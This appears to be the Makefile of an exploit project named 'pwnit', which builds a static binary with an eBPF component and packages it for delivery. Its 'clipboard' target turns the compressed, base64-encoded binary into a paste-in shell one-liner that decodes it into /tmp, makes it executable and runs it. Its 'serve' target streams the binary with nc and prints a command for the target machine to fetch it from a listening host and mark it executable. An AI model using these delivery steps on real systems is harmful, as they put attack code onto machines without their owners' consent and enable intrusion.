WORKDIR=/tmp

.PHONY: clibpoard
clipboard: pwnit.sh
	xclip -selection c <pwnit.sh

pwnit.sh: pwnit.gz.b64
	(echo 'rm -f $(WORKDIR)/pwnit && base64 -d <<HERE | gzip -d >$(WORKDIR)/pwnit && chmod a+x $(WORKDIR)/pwnit && $(WORKDIR)/pwnit' && cat pwnit.gz.b64 && echo 'HERE') >pwnit.sh

pwnit.gz.b64: pwnit.gz
	base64 <pwnit.gz >pwnit.gz.b64

pwnit.gz: pwnit
	gzip -9 <$< >$@

pwnit: pwnit.c pwnit.skel.h offsets.h
	gcc -o $@ -static -pthread -Os -Wall -Wextra -Werror $< -lbpf -lelf -lz -lzstd -Wno-stringop-overflow

pwnit.bpf.o: pwnit.bpf.c
	clang -target bpf -D__TARGET_ARCH_x86 -I/usr/include/x86_64-linux-gnu -I/usr/include/bpf -g -O2 -c $< -o $@

# Create BPF skeleton
pwnit.skel.h: pwnit.bpf.o
	bpftool gen skeleton $< > $@

.PHONY: serve
serve: pwnit
	@echo
	@echo 'target$$ nc 192.168.1.180 9999 >/tmp/pwnit && chmod a+x /tmp/pwnit'
	@echo
	nc -l 9999 <pwnit >/dev/null

.PHONY: fmt
fmt:
	clang-format -i pwnit.c pwnit.bpf.c

.PHONY: clean
clean:
	rm -f pwnit.sh pwnit.gz.b64 pwnit.gz pwnit pwnit.bpf.o pwnit.skel.h
